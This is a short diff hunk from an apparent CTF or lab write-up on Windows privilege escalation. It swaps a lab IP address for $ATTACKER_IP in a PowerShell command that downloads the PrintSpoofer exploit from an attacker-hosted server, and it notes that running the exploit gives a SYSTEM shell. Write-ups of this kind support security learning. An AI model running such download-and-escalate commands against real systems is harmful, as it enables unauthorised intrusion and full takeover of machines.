@@ -689,7 +689,7 @@ To understand it:
 Download [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
 
 ```bash
-Invoke-WebRequest -Uri http://10.8.37.127:8000/PrintSpoofer64.exe -OutFile printspoofer.exe
+Invoke-WebRequest -Uri http://$ATTACKER_IP:8000/PrintSpoofer64.exe -OutFile printspoofer.exe
 ```
 
 Run it, the resulting shell has us `NT AUTORITY\SYSTEM`
